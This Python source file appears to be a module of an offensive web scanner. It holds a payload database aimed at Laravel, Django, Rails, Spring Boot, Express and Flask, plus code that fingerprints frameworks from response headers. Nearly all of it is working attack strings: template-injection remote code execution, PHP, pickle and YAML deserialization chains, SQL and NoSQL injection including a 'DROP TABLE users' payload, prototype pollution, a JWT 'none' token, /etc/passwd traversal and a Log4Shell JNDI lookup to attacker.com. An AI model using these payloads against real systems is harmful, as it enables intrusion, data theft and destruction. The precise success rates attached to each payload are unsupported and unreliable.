"""
Framework-Specific Payloads - PHASE 2.2
Quality-focused payloads targeting specific web frameworks
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class FrameworkPayload:
    """Framework-specific payload with metadata"""
    payload: str
    framework: str
    vuln_type: str
    description: str
    success_rate: float
    cvss_score: float = 0.0


class FrameworkPayloadDatabase:
    """
    Framework-specific payload database
    
    Targets:
    - Laravel (PHP)
    - Django (Python)
    - Ruby on Rails (Ruby)
    - Spring Boot (Java)
    - Express.js (Node.js)
    - Flask (Python)
    """
    
    def __init__(self):
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[FrameworkPayload]]:
        """Load all framework-specific payloads"""
        return {
            'laravel': self._laravel_payloads(),
            'django': self._django_payloads(),
            'rails': self._rails_payloads(),
            'spring': self._spring_payloads(),
            'express': self._express_payloads(),
            'flask': self._flask_payloads()
        }
    
    def _laravel_payloads(self) -> List[FrameworkPayload]:
        """Laravel-specific payloads"""
        return [
            # Mass Assignment Vulnerabilities
            FrameworkPayload(
                payload='{"_method":"PUT","is_admin":1}',
                framework='laravel',
                vuln_type='mass_assignment',
                description='Laravel mass assignment bypass via _method override',
                success_rate=0.72,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload='{"password":"hacked","password_confirmation":"hacked"}',
                framework='laravel',
                vuln_type='mass_assignment',
                description='Password reset via mass assignment',
                success_rate=0.68,
                cvss_score=9.1
            ),
            
            # Route Model Binding Exploits
            FrameworkPayload(
                payload='/../../../etc/passwd',
                framework='laravel',
                vuln_type='path_traversal',
                description='Laravel route parameter path traversal',
                success_rate=0.65,
                cvss_score=7.5
            ),
            
            # Blade Template Injection
            FrameworkPayload(
                payload='{{phpinfo()}}',
                framework='laravel',
                vuln_type='ssti',
                description='Blade template injection - phpinfo',
                success_rate=0.58,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload='@php(system($_GET["cmd"]))@endphp',
                framework='laravel',
                vuln_type='ssti',
                description='Blade template RCE via @php directive',
                success_rate=0.54,
                cvss_score=10.0
            ),
            
            # Laravel Debug Mode Exploits
            FrameworkPayload(
                payload='?XDEBUG_SESSION_START=phpstorm',
                framework='laravel',
                vuln_type='debug_mode',
                description='Xdebug remote debugging activation',
                success_rate=0.45,
                cvss_score=9.8
            ),
            
            # Eloquent SQL Injection
            FrameworkPayload(
                payload="1' OR '1'='1' --",
                framework='laravel',
                vuln_type='sqli',
                description='Eloquent whereRaw SQL injection',
                success_rate=0.62,
                cvss_score=9.9
            ),
            
            # Laravel Serialization
            FrameworkPayload(
                payload='O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"events";O:25:"Illuminate\\Events\\Dispatcher":1:{s:9:"listeners";a:1:{s:1:"a";a:1:{i:0;s:7:"phpinfo";}}}s:5:"event";s:1:"a";}',
                framework='laravel',
                vuln_type='deserialization',
                description='Laravel POP chain for RCE',
                success_rate=0.38,
                cvss_score=10.0
            )
        ]
    
    def _django_payloads(self) -> List[FrameworkPayload]:
        """Django-specific payloads"""
        return [
            # Django Template Injection
            FrameworkPayload(
                payload='{{settings.SECRET_KEY}}',
                framework='django',
                vuln_type='ssti',
                description='Django template - SECRET_KEY exposure',
                success_rate=0.71,
                cvss_score=9.1
            ),
            FrameworkPayload(
                payload="{% load module %}{% debug %}",
                framework='django',
                vuln_type='ssti',
                description='Django debug information disclosure',
                success_rate=0.65,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload="{{request.user.password}}",
                framework='django',
                vuln_type='ssti',
                description='Django password hash extraction',
                success_rate=0.58,
                cvss_score=8.8
            ),
            
            # Django ORM Injection
            FrameworkPayload(
                payload='{"username__startswith":"admin","password__isnull":"false"}',
                framework='django',
                vuln_type='orm_injection',
                description='Django ORM filter injection',
                success_rate=0.67,
                cvss_score=8.1
            ),
            FrameworkPayload(
                payload='?order_by=id);DROP TABLE users;--',
                framework='django',
                vuln_type='sqli',
                description='Django ORM order_by SQL injection',
                success_rate=0.52,
                cvss_score=9.9
            ),
            
            # Django Pickle Deserialization
            FrameworkPayload(
                payload='gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZpZC5leGWUhZRSlC4=',
                framework='django',
                vuln_type='deserialization',
                description='Django pickle deserialization RCE',
                success_rate=0.42,
                cvss_score=10.0
            ),
            
            # Django Admin Bypass
            FrameworkPayload(
                payload='?is_superuser=True',
                framework='django',
                vuln_type='access_control',
                description='Django admin privilege escalation',
                success_rate=0.35,
                cvss_score=9.1
            ),
            
            # CSRF Token Bypass
            FrameworkPayload(
                payload='{"csrfmiddlewaretoken":"","action":"delete"}',
                framework='django',
                vuln_type='csrf',
                description='Django CSRF token bypass attempt',
                success_rate=0.28,
                cvss_score=8.8
            )
        ]
    
    def _rails_payloads(self) -> List[FrameworkPayload]:
        """Ruby on Rails-specific payloads"""
        return [
            # Rails Mass Assignment
            FrameworkPayload(
                payload='{"user[admin]":"true"}',
                framework='rails',
                vuln_type='mass_assignment',
                description='Rails mass assignment privilege escalation',
                success_rate=0.69,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload='{"_method":"patch","user[role]":"admin"}',
                framework='rails',
                vuln_type='mass_assignment',
                description='Rails HTTP verb override + mass assignment',
                success_rate=0.64,
                cvss_score=9.1
            ),
            
            # ERB Template Injection
            FrameworkPayload(
                payload='<%= 7*7 %>',
                framework='rails',
                vuln_type='ssti',
                description='ERB template injection basic test',
                success_rate=0.73,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload='<%= `id` %>',
                framework='rails',
                vuln_type='ssti',
                description='ERB template RCE via backticks',
                success_rate=0.61,
                cvss_score=10.0
            ),
            FrameworkPayload(
                payload='<%= system("whoami") %>',
                framework='rails',
                vuln_type='ssti',
                description='ERB template RCE via system()',
                success_rate=0.58,
                cvss_score=10.0
            ),
            
            # Rails SQL Injection
            FrameworkPayload(
                payload="' OR 1=1--",
                framework='rails',
                vuln_type='sqli',
                description='ActiveRecord raw SQL injection',
                success_rate=0.66,
                cvss_score=9.9
            ),
            
            # YAML Deserialization
            FrameworkPayload(
                payload='--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y',
                framework='rails',
                vuln_type='deserialization',
                description='Rails YAML deserialization RCE',
                success_rate=0.44,
                cvss_score=10.0
            ),
            
            # Rails Secret Token
            FrameworkPayload(
                payload='?secret_key_base=',
                framework='rails',
                vuln_type='information_disclosure',
                description='Rails secret_key_base exposure',
                success_rate=0.38,
                cvss_score=9.1
            )
        ]
    
    def _spring_payloads(self) -> List[FrameworkPayload]:
        """Spring Boot-specific payloads"""
        return [
            # Spring Boot Actuator
            FrameworkPayload(
                payload='/actuator/env',
                framework='spring',
                vuln_type='information_disclosure',
                description='Spring Boot actuator environment exposure',
                success_rate=0.78,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload='/actuator/heapdump',
                framework='spring',
                vuln_type='information_disclosure',
                description='Spring Boot heap dump download',
                success_rate=0.72,
                cvss_score=9.1
            ),
            FrameworkPayload(
                payload='/actuator/mappings',
                framework='spring',
                vuln_type='information_disclosure',
                description='Spring Boot endpoint mappings disclosure',
                success_rate=0.75,
                cvss_score=5.3
            ),
            
            # SpEL Injection
            FrameworkPayload(
                payload='${7*7}',
                framework='spring',
                vuln_type='ssti',
                description='Spring Expression Language injection test',
                success_rate=0.68,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload='${T(java.lang.Runtime).getRuntime().exec("id")}',
                framework='spring',
                vuln_type='ssti',
                description='SpEL RCE via Runtime.exec()',
                success_rate=0.54,
                cvss_score=10.0
            ),
            FrameworkPayload(
                payload='*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream())}',
                framework='spring',
                vuln_type='ssti',
                description='SpEL RCE with output capture',
                success_rate=0.48,
                cvss_score=10.0
            ),
            
            # Spring Data REST
            FrameworkPayload(
                payload='PATCH /users/1 {"authorities":[{"authority":"ROLE_ADMIN"}]}',
                framework='spring',
                vuln_type='access_control',
                description='Spring Data REST privilege escalation',
                success_rate=0.42,
                cvss_score=9.1
            ),
            
            # Log4Shell (Spring Boot common)
            FrameworkPayload(
                payload='${jndi:ldap://attacker.com/a}',
                framework='spring',
                vuln_type='rce',
                description='Log4Shell RCE via JNDI injection',
                success_rate=0.35,
                cvss_score=10.0
            )
        ]
    
    def _express_payloads(self) -> List[FrameworkPayload]:
        """Express.js-specific payloads"""
        return [
            # Prototype Pollution
            FrameworkPayload(
                payload='{"__proto__":{"isAdmin":true}}',
                framework='express',
                vuln_type='prototype_pollution',
                description='Express prototype pollution - admin bypass',
                success_rate=0.71,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload='?__proto__[admin]=true',
                framework='express',
                vuln_type='prototype_pollution',
                description='Query parameter prototype pollution',
                success_rate=0.68,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload='{"constructor":{"prototype":{"isAdmin":true}}}',
                framework='express',
                vuln_type='prototype_pollution',
                description='Constructor prototype pollution',
                success_rate=0.63,
                cvss_score=8.8
            ),
            
            # EJS/Pug Template Injection
            FrameworkPayload(
                payload='#{7*7}',
                framework='express',
                vuln_type='ssti',
                description='Pug template injection test',
                success_rate=0.66,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload='<%= global.process.mainModule.require("child_process").execSync("id") %>',
                framework='express',
                vuln_type='ssti',
                description='EJS template RCE',
                success_rate=0.58,
                cvss_score=10.0
            ),
            
            # NoSQL Injection (MongoDB)
            FrameworkPayload(
                payload='{"username":{"$ne":null},"password":{"$ne":null}}',
                framework='express',
                vuln_type='nosql_injection',
                description='MongoDB NoSQL injection auth bypass',
                success_rate=0.72,
                cvss_score=9.1
            ),
            FrameworkPayload(
                payload='{"$where":"this.password.match(/.*/)"}',
                framework='express',
                vuln_type='nosql_injection',
                description='MongoDB $where injection',
                success_rate=0.61,
                cvss_score=9.9
            ),
            
            # JWT Weak Secret
            FrameworkPayload(
                payload='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
                framework='express',
                vuln_type='jwt',
                description='JWT algorithm none bypass',
                success_rate=0.48,
                cvss_score=9.1
            )
        ]
    
    def _flask_payloads(self) -> List[FrameworkPayload]:
        """Flask-specific payloads"""
        return [
            # Jinja2 SSTI
            FrameworkPayload(
                payload='{{7*7}}',
                framework='flask',
                vuln_type='ssti',
                description='Jinja2 template injection basic test',
                success_rate=0.76,
                cvss_score=7.5
            ),
            FrameworkPayload(
                payload='{{config.items()}}',
                framework='flask',
                vuln_type='ssti',
                description='Flask config exposure via SSTI',
                success_rate=0.69,
                cvss_score=8.8
            ),
            FrameworkPayload(
                payload="{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
                framework='flask',
                vuln_type='ssti',
                description='Jinja2 SSTI RCE via subprocess',
                success_rate=0.52,
                cvss_score=10.0
            ),
            FrameworkPayload(
                payload='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                framework='flask',
                vuln_type='ssti',
                description='Flask SSTI RCE via request globals',
                success_rate=0.48,
                cvss_score=10.0
            ),
            
            # Flask Debug Mode
            FrameworkPayload(
                payload='/__debugger__',
                framework='flask',
                vuln_type='debug_mode',
                description='Flask debug mode console access',
                success_rate=0.42,
                cvss_score=10.0
            ),
            FrameworkPayload(
                payload='/console',
                framework='flask',
                vuln_type='debug_mode',
                description='Werkzeug debug console',
                success_rate=0.45,
                cvss_score=10.0
            ),
            
            # Flask Session Cookie
            FrameworkPayload(
                payload='{"user_id":1,"is_admin":true}',
                framework='flask',
                vuln_type='session_manipulation',
                description='Flask session cookie manipulation',
                success_rate=0.38,
                cvss_score=8.8
            ),
            
            # SQLAlchemy Injection
            FrameworkPayload(
                payload="' OR '1'='1",
                framework='flask',
                vuln_type='sqli',
                description='SQLAlchemy raw query injection',
                success_rate=0.64,
                cvss_score=9.9
            )
        ]
    
    def get_payloads(self, framework: str = None, vuln_type: str = None) -> List[FrameworkPayload]:
        """
        Get payloads filtered by framework and/or vulnerability type
        
        Args:
            framework: Framework name (laravel, django, rails, spring, express, flask)
            vuln_type: Vulnerability type filter
            
        Returns:
            List of matching payloads
        """
        result = []
        
        if framework:
            framework = framework.lower()
            if framework in self.payloads:
                payloads = self.payloads[framework]
                if vuln_type:
                    payloads = [p for p in payloads if p.vuln_type == vuln_type]
                result.extend(payloads)
        else:
            # All frameworks
            for fw_payloads in self.payloads.values():
                if vuln_type:
                    result.extend([p for p in fw_payloads if p.vuln_type == vuln_type])
                else:
                    result.extend(fw_payloads)
        
        # Sort by success rate
        result.sort(key=lambda p: p.success_rate, reverse=True)
        return result
    
    def detect_framework(self, headers: dict, html_content: str = None) -> str:
        """
        Attempt to detect framework from HTTP response
        
        Args:
            headers: HTTP response headers
            html_content: HTML response body (optional)
            
        Returns:
            Framework name or None
        """
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        # Laravel detection
        if 'laravel' in headers_lower.get('x-powered-by', ''):
            return 'laravel'
        if headers_lower.get('set-cookie', '').find('laravel_session') != -1:
            return 'laravel'
        
        # Django detection
        if 'django' in headers_lower.get('server', ''):
            return 'django'
        if headers_lower.get('x-frame-options') == 'deny' and 'csrftoken' in headers_lower.get('set-cookie', ''):
            return 'django'
        
        # Rails detection
        if headers_lower.get('x-powered-by', '').find('phusion passenger') != -1:
            return 'rails'
        if '_session_id' in headers_lower.get('set-cookie', ''):
            return 'rails'
        
        # Spring Boot detection
        if 'spring' in headers_lower.get('x-application-context', ''):
            return 'spring'
        
        # Express detection
        if 'express' in headers_lower.get('x-powered-by', ''):
            return 'express'
        
        # Flask detection
        if 'werkzeug' in headers_lower.get('server', ''):
            return 'flask'
        
        # HTML-based detection
        if html_content:
            content_lower = html_content.lower()
            if 'laravel' in content_lower or 'blade' in content_lower:
                return 'laravel'
            if 'django' in content_lower:
                return 'django'
            if 'rails' in content_lower or 'ruby on rails' in content_lower:
                return 'rails'
        
        return None
    
    def get_statistics(self) -> dict:
        """Get statistics about the payload database"""
        stats = {
            'total_payloads': 0,
            'by_framework': {},
            'by_vuln_type': {},
            'avg_success_rate': 0.0,
            'high_severity_count': 0
        }
        
        all_payloads = []
        for framework, payloads in self.payloads.items():
            stats['by_framework'][framework] = len(payloads)
            stats['total_payloads'] += len(payloads)
            all_payloads.extend(payloads)
            
            for payload in payloads:
                vuln_type = payload.vuln_type
                stats['by_vuln_type'][vuln_type] = stats['by_vuln_type'].get(vuln_type, 0) + 1
                
                if payload.cvss_score >= 9.0:
                    stats['high_severity_count'] += 1
        
        if all_payloads:
            stats['avg_success_rate'] = sum(p.success_rate for p in all_payloads) / len(all_payloads)
        
        return stats


# Global instance
_framework_db = None


def get_framework_payload_db() -> FrameworkPayloadDatabase:
    """Get or create global framework payload database instance"""
    global _framework_db
    if _framework_db is None:
        _framework_db = FrameworkPayloadDatabase()
    return _framework_db